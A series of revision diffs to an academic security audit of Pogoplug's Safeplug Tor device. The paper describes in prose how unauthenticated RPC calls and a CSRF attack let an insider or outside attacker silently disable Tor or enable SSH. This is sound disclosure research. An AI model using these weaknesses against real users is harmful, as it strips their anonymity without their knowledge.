-A typical example is a cookie and a hidden form field set in the settings page of the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server \cite{csrfdef}.
+A typical approach to preventing CSRF attacks is using a cookie and a hidden form field set in the settings page of the Safeplug hosts; the cookie must be returned by the browser when making the POST request to the RPC server \cite{csrfdef}.
 Although someone doing a CSRF attack such as the one described above could get the cookie sent, because of the same-origin policy, the adversary would not be able to examine the contents of the cookie to determine what to put in the form field.

### 2014-03-02 w2sp/report.tex
made changes to figure, graph, arrangement
Fixes to the remaining todos from todo.txt

@@
 However, even if the engineering vulnerabilities are fixed with proper authentication for modifying Safeplug settings, the incompleteness of the provided anonymity and risks of adding an additional box to the trusted inside of the home network mean that there is little reason to use the Safeplug over the Tor Browser Bundle.
+Unlike the plain Tor technology, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
 
@@
 \centering
-\includegraphics[width=.75\textwidth]{instructions2}
+\includegraphics[width=.65\textwidth]{instructions2}
 \caption{Setup instructions (and the only documentation) that came in the box with the Safeplug.
@@
 \section{Design and Operation of Safeplug}
-
-\subsection{Information Prior to Using the Device: Terms of Service}
-\label{tos}
-The Terms of Service (TOS) contains three main points of interest: TOS updates, open source licensing information, and software updates.
-First, the TOS are not presented to the user in the Safeplug package (the only information in the packaging were the instructions shown in Figure~\ref{fig:instructions}) or during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
-Although use of the Safeplug device purportedly constitutes acceptance of the TOS, most users are not likely to read the TOS even once.
-However, Pogoplug suggests that users regularly review the TOS because they can update or change them at any time; this is standard language in TOS but not a good combination with them not being presented to the user.
-
-Following good security and development practices, the Safeplug makes use of several pieces of Open Source software.
-A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
-The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead and instead the reader sees a 404 error \cite{safeplug}.
-This dead link was noted by some members of the Tor-talk mailing list in November 2013 and has not been fixed as of Feburary 2014 \cite{tormailinglist}.
-Pogoplug's open source page does exist at \url{https://pogoplug.com/opensource} and includes several pieces of software for the Safeplug: bootloader, Linux kernel, XCE kernel support driver, glibc, BusyBox, and a Safeplug source bundle.
-However, there is no way to find this page from the Terms of Service.
-
-The final area of interest was software updates on the device which will be ``automatically delivered'' to the user, but it is unclear whether there will be any notification~\cite{safeplug}.
-Although a prompt updating mechanism is an important security feature for users who trust Pogoplug and their update servers (in fact the activation process seems designed for keeping the software up to date and it is concerning that this does not seem to uniformly occur as discussed in Section~\ref{versions}), other users might want to disable this functionality for fear of a malicious use of Pogoplug's servers or a spoofing attack (see Section \ref{dnsspoof}).
-This is one of the many reasons why users who truly need security and anonymity should opt for the Tor Browser Bundle rather than adding the Safeplug to their network.
-
-\subsection{Explanation of Tor Configuration Options}
-\label{port9001}
-One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially set up, the default setting is to not use it as a relay node.
-
-The settings page describes Tor in an extremely basic way:
-
-\begin{quotation}
-``Safeplug uses the Tor network to secure your Internet connection.
-Tor works by routing your Internet through a series of random destinations, much like driving a twisty, complicated route to throw off someone who is following you, making it impossible for websites and organizations to identify the source or destination of Internet traffic.'' \cite{safeplug}
-\end{quotation}
-
-On the other hand, it describes the functionality of a Tor relay node in a much more technical manner:
-\begin{quotation}
-``Make the Tor network strong for everybody!
-Enabling Tor Relay allows your Safeplug to act as a relay point on the Tor network.
-The more Tor relays that join the Tor network, the faster and more robust Tor becomes, helping everybody be more secure online.
-\\ \\ NOTE: You must forward inbound traffic on port 9001 to [IP-of-Safeplug].
-\\ For help configuring your router, click here.''
-\cite{safeplug}
-\end{quotation}
-
-The link provided is to an advertisement-filled and not particularly reputable-looking website with no clear navigation to get to the necessary instructions.
-
-If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.
-This could be a problem if users simply decide not to do anything with that setting (i.e.
-don't change the setting to use the Safeplug as a relay node).
-In this case, there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
-
-This could easily be remedied; Safeplug should choose a target audience and have consistent descriptions.
-The best option is to explain the Tor network and the functionality of a Tor relay node at the same level, preferably a level that normal Internet users can understand.
-This increases the chances that users will run their Safeplug as a relay node.
-
-Another consequence of misunderstanding the use of the Safeplug as a relay node, or more specifically, as an exit node is the possible legal repercussions.
-As an exit relay, all traffic that exits the node can be traced back to the Safeplug's IP address; it is likely that some of this traffic contains illegal information or is part of illegal activities.
-The Tor Project recommends not running an exit relay from a user's home: ``If law enforcement becomes interested in traffic from your exit relay, it's possible that officers will seize your computer.
-For that reason, it's best not to run your exit relay in your home or using your home Internet connection~\cite{law}.''  Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay, especially without providing the user with any information.
 
@@
 
+\subsection{Information Prior to Using the Device: Terms of Service}
+\label{tos}
+The Terms of Service (TOS) contains three main points of interest: TOS updates, open source licensing information, and software updates.
+First, the TOS are not presented to the user in the Safeplug package (the only information in the packaging were the instructions shown in Figure~\ref{fig:instructions}) or during the activation process, and are only available through a small link at the bottom of the Safeplug website\cite{safeplug}.
+Although use of the Safeplug device purportedly constitutes acceptance of the TOS, most users are not likely to read the TOS even once.
+However, Pogoplug suggests that users regularly review the TOS because they can update or change them at any time; this is standard language in TOS but not a good combination with them not being presented to the user.
+
+Following good security and development practices, the Safeplug makes use of several pieces of Open Source software.
+A standard term of many open source licenses states that a company that uses the open source software must list the software used and its license, as well as the open source code of their own software that uses the license.
+The TOS contains a link to a page that would supposedly comply with this requirement: \url{http://pogoplug.com/home-en-developers-open-source.html} but the link is dead and instead the reader sees a 404 error \cite{safeplug}.
+This dead link was noted by some members of the Tor-talk mailing list in November 2013 and has not been fixed as of Feburary 2014 \cite{tormailinglist}.
+Pogoplug's open source page does exist at \url{https://pogoplug.com/opensource} and includes several pieces of software for the Safeplug: bootloader, Linux kernel, XCE kernel support driver, glibc, BusyBox, and a Safeplug source bundle.
+However, there is no way to find this page from the Terms of Service.
+
+The final area of interest was software updates on the device which will be ``automatically delivered'' to the user, but it is unclear whether there will be any notification~\cite{safeplug}.
+Although a prompt updating mechanism is an important security feature for users who trust Pogoplug and their update servers (in fact the activation process seems designed for keeping the software up to date and it is concerning that this does not seem to uniformly occur as discussed in Section~\ref{versions}), other users might want to disable this functionality for fear of a malicious use of Pogoplug's servers or a spoofing attack (see Section \ref{dnsspoof}).
+This is one of the many reasons why users who truly need security and anonymity should opt for the Tor Browser Bundle rather than adding the Safeplug to their network.
+
 \subsection{Activation and Setup}
@@
 We followed them, activated our device, and then ended on the configurations page.
-The configurations page has a combination of platforms and browsers, with a different set of proxy configuration instructions for each one.
+The configurations page has a combination of platforms and browsers, shown in the table below, with a different set of proxy configuration instructions for each one.
 The platforms presented include popular desktop and mobile platforms.
-The Tor Project has an Android application, as well as the Tor Browser Bundle for Windows and OSX (and Linux, which is not supported explicitly by Pogoplug's page but is likely to have a browser with similar configuration processes to Firefox).
-However, there is no existing Tor Project application for iOS.
+For every browser on every client device that the user wants to protect, they must set up the Safeplug as the browser's HTTP proxy and ensure that the proxy stays set up when the browser is updated or re-installed.
+
+%\begin{table}[!t]
+%\renewcommand{\arraystretch}{1.3}
+%\caption{The platforms and browsers that the Safeplug settings page provides instructions for.}
+%\label{table_example}
+%\centering
+%	\begin{tabular}{|c|c|}
+%	\hline
+%		Platform & Browsers \\ \hline
+%		Windows	& Internet Explorer, Chrome, Firefox \\ \hline
+%		OSX & Safari, Chrome, Firefox \\ \hline
+%		iOS	& Safari \\ \hline
+%		Android	& Chrome \\ \hline
+%	\end{tabular}
+%\end{table}
 
@@
 This page is shown in Figure~\ref{fig:settings}.
-This allowed us to turn Tor on/off, add white-listed websites, turn ad-blocking on/off, and turn the ability of our device to be a relay node on/off (and if on, an additional option appeared to allow the device to be an exit node).
-
-\begin{figure}[htb]
+This page allows the user to set a number of options on the device, including turning Tor on/off, turning ad-blocking on/off, and turning relay node ability on/off (and if on, an additional option appeared to allow the device to be an exit node).
+Additionally, the user can specify ``white-listed'' domains that will be connected to directly even if Tor is turned on, without going through the Tor network.
+The Safeplug FAQ website describes this as an option for bank websites or other sites that might completely prevent logons from foreign IP addresses\cite{safeplug}.
+
+\begin{figure*}
   \centering
-  \includegraphics[width=.4\textwidth]{settings_with_exit}
+  \includegraphics[width=.7\textwidth]{settings_with_exit}
   \caption{Safeplug settings page.  The last button ``Allow Exit'' only appears if the relay option above has been turned on.}
   \label{fig:settings}
-\end{figure}
+\end{figure*}
+
+\subsection{Explanation of Tor Configuration Options}
+\label{port9001}
+One of Safeplug's configurations is the use of the device as a Tor relay node in the Tor network.  When the device is initially set up, the default setting is to not use it as a relay node.
+
+The settings page describes Tor in an extremely basic way:
+
+\begin{quotation}
+``Safeplug uses the Tor network to secure your Internet connection.
+Tor works by routing your Internet through a series of random destinations, much like driving a twisty, complicated route to throw off someone who is following you, making it impossible for websites and organizations to identify the source or destination of Internet traffic.'' \cite{safeplug}
+\end{quotation}
+
+On the other hand, it describes the functionality of a Tor relay node in a much more technical manner:
+\begin{quotation}
+``Make the Tor network strong for everybody!
+Enabling Tor Relay allows your Safeplug to act as a relay point on the Tor network.
+The more Tor relays that join the Tor network, the faster and more robust Tor becomes, helping everybody be more secure online.
+\\ \\ NOTE: You must forward inbound traffic on port 9001 to [IP-of-Safeplug].
+\\ For help configuring your router, click here.''
+\cite{safeplug}
+\end{quotation}
+
+The link provided is to an advertisement-filled and not particularly reputable-looking website with no clear navigation to get to the necessary instructions.
+
+If the majority of users can only understand the simpler description, then they likely won't understand the description of a Tor relay node.
+This could be a problem if users simply decide not to do anything with that setting (i.e.
+don't change the setting to use the Safeplug as a relay node).
+In this case, there would be a large increase in use of the Tor network, yet most of the users are not giving back to it.
+
+This could easily be remedied; Safeplug should choose a target audience and have consistent descriptions.
+The best option is to explain the Tor network and the functionality of a Tor relay node at the same level, preferably a level that normal Internet users can understand.
+This increases the chances that users will run their Safeplug as a relay node.
+
+Another consequence of misunderstanding the use of the Safeplug as a relay node, or more specifically, as an exit node is the possible legal repercussions.
+As an exit relay, all traffic that exits the node can be traced back to the Safeplug's IP address; it is likely that some of this traffic contains illegal information or is part of illegal activities.
+The Tor Project recommends not running an exit relay from a user's home: ``If law enforcement becomes interested in traffic from your exit relay, it's possible that officers will seize your computer.
+For that reason, it's best not to run your exit relay in your home or using your home Internet connection~\cite{law}.''  Considering that the Safeplug is intended for home use, it is a poor design choice to allow the user to use it as an exit relay, especially without providing the user with any information.
 
@@
 We used Panopticlick to examine the fingerprint of a freshly installed Firefox browser running through the Safeplug proxy~\cite{panopticlick}.
-Panopticlick found the browser to be unique.
-Fingerprinting is another way in which websites could correlate and de-anonymize user traffic without knowing the IP address.
+Panopticlick found the browser to be unique, which means that websites that did fingerprinting could very accurately track, correlate, and de-anonymize user traffic without knowing the IP address or even storing a cookie.
+The presence of the Safeplug, as an HTTP proxy, should be completely undetectable by the fingerprinting service by the design of HTTP making proxies transparent.
+Unlike the Tor Browser Bundle, Safeplug users do not even have the fingerprints of other users of the service to help hide their fingerprints.
+Allowing the user to use their own browsers significantly incrases the amount of variation and customization between users and therefore the likelihood of having a unique fingerprint.
+This danger to anonymity (unlike cookies) is not even mentioned in the Safeplug FAQ page~\cite{safeplug}.
 
@@
   \centering
-  \includegraphics[width=0.7\textwidth]{graph2}
+  \includegraphics[width=0.5\textwidth]{latencygraph}
   \caption{Latency of web requests.}
@@
 \subsection{Insider Attack}
-Since the Safeplug has no validation or authentication on the settings page or these RPC calls, any malicious party inside the network could easily modify the settings.
+Since the Safeplug has no validation or authentication on the settings page or these RPC calls, any malicious party inside the home network could easily modify the settings.
 Such an adversary with a computer could load the Safeplug's settings page and adjust options such as disabling Tor or adding a site to the whitelist; since this page is meant to be accessible to normal Internet users, anyone can perform this attack.
 Unlike many home routers, there is no username/password combination necessary to access this page.
-
 A more technically advanced user could send the call directly to the RPC server.
 All the attacker would need to know is the IP address of the device.
-It does not require SSH or discovering the (publically available) root password, or the user's new root password if they have been well-informed and adept enough to change it.
 Figure \ref{disable} shows an example of the RPC version of this attack.
+
+Since the only form of authentication is access to the home network, if the adversary can get into the network they can perform these attacks.
+For example, if the user has an open WiFi network, then anyone nearby can launch this attack - potentially peforming a sort of drive-by deanonymization.
+Similarly, the Safeplug would be utterly ineffective at securing traffic from a public network such as a hotel or cafe because every logged in user on that network could change the settings.
 
@@
     Another command available to the RPC server is enabling SSH to the device.
-SSH instructions for Cloud Engine's other device (Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
+SSH instructions for Pogoplug's other device (called Pogoplug) are widely available online and an email in the Tor-talk mailing list confirms that the instructions are the same \cite{ceadmin}:
 \begin{lstlisting}
@@
 Although the Tor Project publishes an Android app called Orbot on the Android Market, which is supported for Android versions 2.3 and later, there are no official Tor apps for iPhones or other non-Android devices~\cite{orbot,amorbot}.
-Safeplug provides proxy functionality and instructions for Safari on the iPhone; however, this would only work while the user is on that wifi network that the Safeplug routes through.
+Safeplug provides proxy functionality and instructions for Safari on the iPhone and Chrome on Android.
+However, while this does supposedly give the option for more mobile users to make use of Tor, proxy configuation on mobile devices comes with significant usability issues.
+For example, the proxying would only work while the user is on that wifi network that the Safeplug routes through.
 If any data is sent over the cellular network or another wifi network, then the security of Tor is lost.

### 2014-03-03 w2sp/report.tex
finished up second draft

@@
 \subfloat[][Top of the board inside the Safeplug device.]{
-  \includegraphics[width=.3\textwidth]{safeplug_listed_top}
+  \includegraphics[width=.2\textwidth]{safeplug_listed_top}
   \label{fig:top}
@@
 \subfloat[][Bottom of the Board inside the Safeplug device.]{
-  \includegraphics[width=.3\textwidth]{safeplug_hardware_new}
+  \includegraphics[width=.2\textwidth]{safeplug_hardware_new}
   \label{fig:bottom}
@@
 
-\bibitem{nsa} Arther, Charles.  ``NSA scandal: what data is being monitored and how does it work?'' \url{http://www.theguardian.com/world/2013/jun/07/nsa-prism-records-surveillance-questions}.
+%\bibitem{nsa} Arther, Charles.  ``NSA scandal: what data is being monitored and how does it work?'' \url{http://www.theguardian.com/world/2013/jun/07/nsa-prism-records-surveillance-questions}.
 
@@
 
-\bibitem{fingerprint2} Kohno, Tadayoshi et. al. "Remote physical device fingerprinting." Dependable and Secure Computing, IEEE Transactions on 2.2 (2005): 93-108.
+%\bibitem{fingerprint2} Kohno, Tadayoshi et. al. "Remote physical device fingerprinting." Dependable and Secure Computing, IEEE Transactions on 2.2 (2005): 93-108.
 
@@
 
-\bibitem{marvell} Marvell, ``Marvell 88F6192 SoC with Sheeva Technology'' 2009. \url{http://www.marvell.com//embedded-processors/kirkwood/assets/88F6192-003_ver1.pdf}
-
-\bibitem{marvell2} Marvell, ``Marvell Alaska 88E1116R'' 2007. \url{http://www.marvell.com/transceivers/assets/Marvell-Alaska-88E1116R-Single-Port-GbE.pdf}
+%\bibitem{marvell} Marvell, ``Marvell 88F6192 SoC with Sheeva Technology'' 2009. \url{http://www.marvell.com//embedded-processors/kirkwood/assets/88F6192-003_ver1.pdf}
+
+%\bibitem{marvell2} Marvell, ``Marvell Alaska 88E1116R'' 2007. \url{http://www.marvell.com/transceivers/assets/Marvell-Alaska-88E1116R-Single-Port-GbE.pdf}
 
@@
 
-\bibitem{gigaom} Meyer, David.
+%\bibitem{gigaom} Meyer, David.
 ``Say hello to Safeplug, Pogoplug’s \$49 Tor-in-a-box for anonymous surfing'', \emph{GigaOm}, 21 November 2013.
@@
 
-\bibitem{pano} Panopticlick. \url{https://panopticlick.eff.org/}.
+%\bibitem{pano} Panopticlick. \url{https://panopticlick.eff.org/}.
 
@@
 
-\bibitem{schneier} Schneier, Bruce. ``Tor Appliance.'' \emph{Schneier on Security}, 27 November 2013. \url{https://www.schneier.com/blog/archives/2013/11/tor_appliance.html}.
+%\bibitem{schneier} Schneier, Bruce. ``Tor Appliance.'' \emph{Schneier on Security}, 27 November 2013. \url{https://www.schneier.com/blog/archives/2013/11/tor_appliance.html}.
 
@@
 
-\bibitem{techreview} Simonite, Tom.
+%\bibitem{techreview} Simonite, Tom.
 ``Online Anonymity in a Box, for \$49'', \emph{MIT Technology Review}, 21 November 2013.
@@
 
-\bibitem{wireshark} Wireshark, \url{http://www.wireshark.org/}.
+%\bibitem{wireshark} Wireshark, \url{http://www.wireshark.org/}.
 

### 2014-03-05 w2sp/report.tex
First 2.5 pages of Josh's edits

@@
 
+% THIS ALLOWS THE THANKS FOOTNOTE
+\IEEEoverridecommandlockouts
+
 \pagestyle{plain}
@@
 % 
-\author{\IEEEauthorblockN{Anna Kornfeld Simpson,
-Anne Edmundson,
-Josh Kroll, and
-Ed Felten}
+\author{\IEEEauthorblockN{Anna Kornfeld Simpson*,
+Anne Edmundson*,
+Joshua A. Kroll, and
+Edward W. Felten}
 \IEEEauthorblockA{Department of Computer Science\\
 Princeton University,
-Princeton, NJ 08540-5233}}
+Princeton, NJ 08540}
+\thanks{*Both authors contributed equally to this work.}}
 
@@
 %\boldmath
-We present the first public third-party security audit of Pogoplug's Safeplug device, which marketed ``complete security and anonymity online'' by using Tor technology to protect users' IP addresses.
+We present the first public third-party security audit of Pogoplug's Safeplug device, which markets ``complete security and anonymity online'' by using Tor technology to protect users' IP addresses.
 We examine the hardware, software, and network behavior of the Safeplug device, as well as the user experience in comparison to other forms of web browsing.
 Although the Safeplug appears to use Tor as advertised, users may still be identified in ways they may not expect.
-Furthermore, an engineering vulnerability in the Safeplug's settings commands would allow an adversary internal or external to a user's home network to silently disable Tor or modify other Safeplug settings, which completely overrules the security claims of the device.
-Even if the engineering problem is fixed, the user experience challenges of this type of device make it inferior to the existing standard in anonymity methods: the Tor Browser Bundle.
+Furthermore, an engineering vulnerability in how the Safeplug accepts settings changes would allow an adversary internal or external to a user's home network to silently disable Tor or modify other Safeplug settings, which completely invalidates the security claims of the device.
+Beyond this problem, the user experience challenges of this type of device make it inferior to the existing gold standard for anonymous browsing: the Tor Browser Bundle.
 \end{abstract}
@@
 
-Privacy on the Internet is becoming increasingly important as more users realize how vulnerable they are to surveillance and attacks; anonymity has become the goal for many Internet users in order to protect themselves.
-A recent study has shown that people have been the victim of many security-related issues, such as compromised emails/accounts, harrassment, stolen Social Security Numbers, bank information, and credit card numbers, due to their online visibility~\cite{pew}.
-As the Internet grows and the amount of user information that is collected and/or provided online increases, users will continue to be more vulnerable.
-According to one study, 86\% of internet users have tried to become more anonymous online by either clearing cookies, encrypting their email, or using virtual networks that mask their IP address~\cite{pew}.
-While this study shows that a large percentage of users are taking measures to reduce their visibility online, 59\% reported that they don't believe it is possible to become completely anonymous online~\cite{pew}.
+Privacy on the Internet is becoming increasingly important as users realize how vulnerable they are to surveillance and theft of their data; anonymity has become the goal for many Internet users in order to protect themselves.
+A recent Pew study listed compromised emails/accounts, harassment, and stolen Social Security Numbers, bank information, and credit card numbers as some of the results of online visibility~\cite{pew}.
+According to the study, 86\% of internet users have tried to become more anonymous online by either clearing cookies, encrypting their email, or using virtual networks that mask their IP address, but despite their efforts, 59\% of users reported that they don't believe it is possible to become completely anonymous online~\cite{pew}.
+Users are dissatisfied with their ability to protect themselves and their data online and do not believe that they have the tools to solve the problem.
 
 The cloud storage company Pogoplug noticed the demand for online anonymity and in December of 2013 they released the Safeplug.
-This device is a small box that plugs into a user's home router and by routing all traffic through Tor, it claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online~\cite{pogo}.
-The Safeplug also claimed simple setup and an abstraction of any technical detail, as shown by the setup instructions that came with the device shown in Figure~\ref{fig:instructions}.
-A device such as this should be audited to confirm or deny the validity of the bold security claims.
-We conducted the first public third-party security audit of the Safeplug by analyzing the hardware, software, and network behavior.
+This device is a small box that plugs into a user's home router and it claims to: conceal your identity, hide where you live, shield your surfing habits, and make you anonymous online by routing all traffic through Tor~\cite{safeplug}.
+The Safeplug also claimed simple setup and the removal of any technical detail, as shown in Figure~\ref{fig:instructions}, the entire setup instructions that came with the device.
+Given Pogoplug's bold security claims about the Safeplug device, the device should be audited by a third-party.
+We conducted the first public third-party security audit of the Safeplug by analyzing the hardware, software, network behavior, and usability of the device.
 The following are some of our findings:
@@
 \begin{itemize}
-\item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor on outgoing traffic (see Figure \ref{fig:flow}).
-\item The browser collects both first- and third-party tracking cookies, de-anonymizing users across websites despite the presence of Tor.
-\item A Safeplug user is vulnerable to a Cross-Site Request Forgery (CSRF) attack that allows an outside attacker to modify the Safeplug settings (i.e., turning Tor on/off, turning ad-blocking on/off, turning the Tor relay setting on/off, adding/removing whitelisted sites from Tor).
+\item The Safeplug functions as a HTTP proxy for the browser, which then uses Tor for outgoing traffic (see Figure \ref{fig:flow}).
+\item Despite the use of Privoxy as an ad-blocker, the Safeplug does nothing to prevent users' browsers from collecting both first- and third-party tracking cookies, allowing users to be de-anonymized across websites despite the presence of Tor.%\cite{arvindpets}.
+\item Safeplug users are vulnerable to a Cross-Site Request Forgery (CSRF) attack that allows an attacker external to their home network to modify the Safeplug settings (including silently turning off the use of Tor).
 \item A malicious user within the network can modify the Safeplug settings without notifying any other devices on the network.
@@
 
-Pogoplug made use of good security principles by using auditable open source software on their device, and has a laudable goal of making online security the standard for more users.
-However, even if the engineering vulnerabilities are fixed with proper authentication for modifying Safeplug settings, the incompleteness of the provided anonymity and risks of adding an additional box to the trusted inside of the home network mean that there is little reason to use the Safeplug over the Tor Browser Bundle.
-Unlike the plain Tor technology, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
+Pogoplug made use of good security principles by using auditable open source software on their device, and has the laudable goal of making online security the standard for more users.
+However, even if the engineering vulnerabilities regarding settings modification and the CSRF attack are fixed by introducing proper authentication for modifying Safeplug settings, given the incompleteness of the provided anonymity and risks of adding an additional box to the trusted inside of the home network, there is little reason to use the Safeplug over the Tor Browser Bundle.
+As well as the Tor network technology used in the Safeplug, the Tor Browser Bundle contains protections against tracking cookies and fingerprinting, making it an improvement over the privacy offerings of the Safeplug.
 
@@
 \section{Background}
-{\bf Tor.} The state-of-the-art in online anonymity technology is the open-source project Tor.
-Tor is a service that provides anonymous communication as an onion router; by encrypting internet traffic and sending it through layers of relays, a user can make it much more difficult to trace their internet use~\cite{tor}.
+{\bf Tor.} The state-of-the-art in online anonymity technology is Tor.
+Tor is a service that provides anonymous communication via an onion router; by encrypting internet traffic and sending it through layers of relays, a user can make it much more difficult to trace their internet use~\cite{tor}.
 Instead of appearing to come from a user's IP address, the traffic will reach the destination from one of the relays, that will have received the traffic from another relay, creating a chain back from when the user first sent their traffic to a relay.
@@
 Tor is open-source software developed by the Tor Project~\cite{torproject}.
-Users of Tor are highly recommended to use it as part of the Tor Browser Bundle, which provides a single installation of a browser and the Tor software package.
-This browser has special settings to prevent deanonymization of the traffic by other means, such as cookies, supercookies, or scripts~\cite{torproject}.
+Users of Tor are highly recommended to access the Tor network via the Tor Browser Bundle, which provides a browser and the Tor software package in a single installation.
+This browser comes configured to prevent deanonymization of web traffic by means that the Tor network does not protect against, such as cookies, supercookies, or scripts~\cite{torproject}.
 
 Using Tor or the Tor Browser Bundle provides a tradeoff between anonymity, usability, and efficiency.
-Sending traffic to these relays around the world slows down the traffic significantly, possibly degrading user experience for websites that load a lot of data in real-time.
-In addition, because the destination website will see the user's request as coming from a new, likely international IP address, websites such as banks that have location-based safeguards may deny users access to their sites.
-For many users around the world, these troubles are a worthwhile price for access to free and open internet, anonymous communications, and resisting censorship.
-However, one of the biggest reasons that Tor is not more widespread is that many Internet users do not know about Tor, how it works, or how they would be able to use it to become more anonymous online.
-
-{\bf Safeplug.} Safeplug is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor without having to know about it or how it works.
-It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49 \cite{safeplug}.
+Sending traffic to these relays around the world significantly increases its latency, possibly degrading user experience for websites that load a lot of data in real-time.
+In addition, because the destination website will see the user's request from a new, likely international IP address, websites such as banks or news sites that have location-based content may deny users access to their sites or the information that they seek.
+For many users around the world, these troubles are a worthwhile price for access to free and open Internet, anonymous communications, and resisting censorship.
+However, one of the biggest reasons that Tor is not more widely used is that many Internet users do not know about Tor, how it works, or how to use it to become more anonymous online.
+
+{\bf Safeplug.} Safeplug \cite{safeplug}, is a product that launched in December of 2013 from the cloud storage company Pogoplug, that offers any user the option of using Tor without having to know about it or how it works.
+It allows users to browse the web from their own standard web browser with “complete security and anonymity” for the cheap price of \$49.
 Safeplug offers Tor out of the box, with no additional software installation, by sitting between a user's router and the Internet \cite{wired}.
-Pogoplug's marketing pitch centers around the protection of users' IP addresses by using Tor \cite{safeplug,bittech}.
-
-{\bf Pogoplug.} Pogoplug, a subsidary of Cloud Engines, also offers a box for home network file sharing without needing to use a third-party storage provider.
-Based on our examination of the box discussed below, we suspect that the Pogoplug hardware was relabelled as Safeplug and simply uses different software to achieve its newly branded purpose.
+Pogoplug's marketing pitch centers around the protection of users' IP addresses by using Tor \cite{bittech}.
+
+{\bf Pogoplug.} Pogoplug, a subsidary of Cloud Engines, also offers secure file server or file storage technologies for home networks, called Pogoplug.
+Based on our examination of the box discussed below, we suspect that a recent version of the Pogoplug hardware was relabeled as Safeplug and simply uses different software to achieve its newly branded purpose.
 
@@
 The board incorporates: (A) an SD card slot, (B) a power connector, (C) a USB slot, (D) an ethernet connector, (E) ethernet transceiver, (F) lan transformer, (G) the Marvell 88F6192 integrated controller, and (H), (I) flash memory.
-The Marvell controller is from 2008 and runs ARM~\cite{marvellhw}.
-This is the same controller as version 4 of Pogoplug's cloud storage device; takedowns of that device that are available online show an identical-looking circuit-board to the one in Figure~\ref{fig:circuit}\cite{pogo4}.
+The Marvell controller is from 2008 and is an ARM SoC~\cite{marvellhw}.
+This is the same controller as version 4 of Pogoplug's cloud storage device; teardowns of that device that are available online show an identical-looking circuit-board to the one in Figure~\ref{fig:circuit}\cite{pogo4}.
 It is also interesting to note that the Safeplug branding is a sticker on the front of the device, whereas the Pogoplug branding is etched into the plastic on top of the device, which indicates that the Safeplug uses the same hardware as Pogoplug's existing devices, and derives its differing functionality from different software.
@@
 
-The Safeplug runs version 2.6.31.8 of Arch Linux on an ARM architecture, which was produced at the end of 2009 and installed on 23 August 2011.
+The Safeplug runs version 2.6.31.8 of Arch Linux for ARM, which was produced at the end of 2009.
 Unsurprising for its age, there are a number of network vulnerabilities for this version of the kernel - most of which produce denial of service attacks if an adversary sends a particularly formed packet \cite{kernelcve}.
 This is the same version of Linux that runs on Version 4 of Pogoplug's Mobile platform \cite{archforum}.
-
-The software installed by the activation process on the Safeplug is in \verb!/opt/xce!
-and includes Lighttpd, Privoxy, and Tor.
-Lighttpd is an open-source webserver, which is serving the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
+The age of the kernel and the inability to patch the kernel and its libraries creates a large security risk for the Safeplug.
+For example, although the Safeplug does not appear to use the recently patched GNUTLS library, if a similar problem had been discovered in one of the Safeplug's libraries, users would have to trust Safeplug to discover and apply the new patch.
+
+As mentioned in the instructions shown in Figure~\ref{fig:instructions}, the Safeplug has an online activation process during which it downloads the software packages it uses to function.
+The software installed by the activation process on the Safeplug is in the \verb!/opt/xce!
+folder of the root filesystem and includes Lighttpd, Privoxy, and Tor.
+Lighttpd is an open-source web-server, which serves the settings page on the device - the project's description mentions ``security, speed, compliance, and flexibility [...
 while being] designed and optimized for high perfomance environments'' \cite{lighttpd}.
-The version of Lighttpd on the box is only one version away from being up to date, 1.4.33 which was released on 27 September 2013.
-The current version of Lighttpd, which has a number of security fixes, was released on 20 January 2014, after the Safeplug was purchased.
+The version of Lighttpd on the box is 1.4.33, which was released on 27 September 2013 and is only one version behind.
+The current version of Lighttpd, which has a number of security fixes, was released on 20 January 2014, after the original release of the Safeplug devices.
 However, checking for an update from the Safeplug does not lead to any updated software installation.
@@
 The version on the device is 3.0.21, which is the most recent release.
-
-The version of Tor is v0.2.3.25 which is from November 2012.
+%%% TODO: More about functionality, or comparison with AdBlock?
+How does it get its filter lists?
+
+The version of Tor is v0.2.3.25 from November 2012.
 The current stable version of Tor is v0.2.4.20 from December 2013.
@@
 
-The fourth piece of software discovered on the device, which is not installed during the activation process and is in \verb!/usr/sbin!
+The fourth piece of software the device, which is not installed during the activation process and is in \verb!/usr/sbin!
 is the Dropbear SSH server and client, used to support SSH access to the device \cite{dropbear}.

### 2014-03-05 w2sp/report.tex
added more of Josh's edits

@@
 }
-\caption{Safeplug circuit board after the teardown.}
+\caption{Safeplug circuit board after the teardown.  The explanation of the components is in the text.}
 \label{fig:circuit}
@@
 Figure \ref{fig:callgraph} shows the call graph for the modifying the settings page.
-When a user modifies the settings page, Javascript on the settings page generates a POST request to xspctrl, which is running via CGI in Lighttpd.
-The CGI handler copies a number of environment variables and then forks and runs the xspctrl as execve (in the constructed environment).
-Xspctrl is a shell script which uses the end of the path to discover the correct method to run and executes any of the necessary binary files with specified arguments (go\_update, go\_upgrade, go\_sshd, or go\_updateexceptions) to complete its request before returning a response.
+When a user modifies the settings page, Javascript on the settings page generates a POST request to {\tt xspctrl}, which is a script running via CGI in Lighttpd.
+The CGI handler copies a number of environment variables from, and then forks and runs {\tt xspctrl} via {\tt execve} (in the constructed environment).
+{\tt xspctrl} is a shell script which dispatches the correct method to run and executes any of the necessary binary files with specified arguments (go\_update, go\_upgrade, go\_sshd, or go\_updateexceptions) to complete its request before returning a response.
 
@@
 \centering
-\includegraphics[width=.55\textwidth]{callgraph}
+\includegraphics[width=.55\textwidth]{new_callgraph}
 \caption{The call graph for modifying the Safeplug settings page.}
@@
